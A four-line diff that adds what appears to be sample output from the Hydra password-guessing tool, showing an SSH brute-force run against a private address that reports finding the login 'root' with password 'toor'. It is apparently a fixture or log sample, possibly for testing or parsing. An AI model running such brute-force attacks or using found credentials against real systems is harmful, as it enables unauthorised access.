@@ -1,0 +1,4 @@
+Hydra v9.3 (c) 2025 by Van Hauser/THC
+[DATA] attacking ssh://192.168.1.1:22/
+[22][ssh] host: 192.168.1.1   login: root   password: toor
+[STATUS] attack finished, 1 valid password found
